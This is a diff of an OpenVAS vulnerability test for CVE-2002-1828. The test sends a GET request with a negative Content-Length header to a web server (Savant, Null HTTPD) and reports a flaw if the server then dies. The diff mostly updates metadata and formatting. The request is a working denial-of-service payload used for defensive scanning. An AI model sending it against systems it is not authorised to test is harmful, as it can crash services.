@@ -1,5 +1,4 @@
 # OpenVAS Vulnerability Test
-# $Id: savant_content_length_DoS.nasl 9348 2018-04-06 07:01:19Z cfischer $
 # Description: HTTP negative Content-Length DoS
 #
 # Authors:
@@ -22,80 +21,62 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 #
 
-tag_summary = "We could crash the Savant web server by sending an invalid
-GET HTTP request with a negative Content-Length field.
-
-A cracker may exploit this flaw to disable your service or
-even execute arbitrary code on your system.";
-
-tag_solution = "Upgrade your web server";
-
-# References:
-#
-# Date: Fri, 13 Sep 2002 19:55:05 +0000
-# From "Auriemma Luigi" <aluigi@pivx.com>
-# To: bugtraq@securityfocus.com
-# Subject: Savant 3.1 multiple vulnerabilities
-#
-# See also:
-# Date:  Sun, 22 Sep 2002 23:19:48 -0000
-# From: "Bert Vanmanshoven" <sacrine@netric.org>
-# To: bugtraq@securityfocus.com
-# Subject: remote exploitable heap overflow in Null HTTPd 0.5.0
-#
-# Vulnerables:
-# Null HTTPD 0.5.0
-
 if(description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.11174");
- script_version("$Revision: 9348 $");
- script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
- script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
- script_cve_id("CVE-2002-1828");
- script_bugtraq_id(5707, 6255);
- script_tag(name:"cvss_base", value:"5.0");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
- 
- name = "HTTP negative Content-Length DoS";
- script_name(name);
- 
+  script_oid("1.3.6.1.4.1.25623.1.0.11174");
+  script_version("2019-04-24T07:26:10+0000");
+  script_tag(name:"last_modification", value:"2019-04-24 07:26:10 +0000 (Wed, 24 Apr 2019)");
+  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
+  script_cve_id("CVE-2002-1828");
+  script_bugtraq_id(5707, 6255);
+  script_tag(name:"cvss_base", value:"5.0");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
+  script_name("HTTP negative Content-Length DoS");
+  script_category(ACT_DESTRUCTIVE_ATTACK);
+  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
+  script_family("Denial of Service");
+  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_require_ports("Services/www", 80);
+  script_exclude_keys("Settings/disable_cgi_scanning");
 
- 
- script_category(ACT_DESTRUCTIVE_ATTACK);
+  script_tag(name:"solution", value:"Upgrade the web server.");
+
+  script_tag(name:"summary", value:"The Savant web server was crashed by sending an invalid
+  GET HTTP request with a negative Content-Length field.");
+
+  script_tag(name:"impact", value:"An attacker may exploit this flaw to disable the service or
+  even execute arbitrary code on the affected system.");
+
+  script_tag(name:"affected", value:"Null HTTPD 0.5.0. Other versions or products might be affected
+  as well.");
+
   script_tag(name:"qod_type", value:"remote_vul");
- 
- script_copyright("This script is Copyright (C) 2002 Michel Arboi");
- family = "Denial of Service";
- script_family(family);
- script_dependencies("find_service.nasl", "http_version.nasl");
- script_require_ports("Services/www", 80);
- script_exclude_keys("Settings/disable_cgi_scanning");
+  script_tag(name:"solution_type", value:"VendorFix");
 
- script_tag(name : "solution" , value : tag_solution);
- script_tag(name : "summary" , value : tag_summary);
- exit(0);
+  exit(0);
 }
 
 include("http_func.inc");
 
 port = get_http_port(default:80);
-
-if(http_is_dead(port:port))exit(0);
+if(http_is_dead(port:port))
+  exit(0);
 
 soc = http_open_socket(port);
-if (! soc) exit(0);
+if(! soc)
+  exit(0);
 
 # Savant attack
 req = string("GET / HTTP/1.0\n\r",
-             "Host: ", get_host_name(), "\r\n",
+             "Host: ", get_host_ip(), "\r\n",
              "Content-Length: -1\r\n\r\n");
 send(socket:soc, data: req);
 r = http_recv(socket: soc);
 http_close_socket(soc);
 
-#
-if(http_is_dead(port: port))
-{
-  security_message(port);
+if(http_is_dead(port: port)) {
+  security_message(port:port);
+  exit(0);
 }
+
+exit(99);
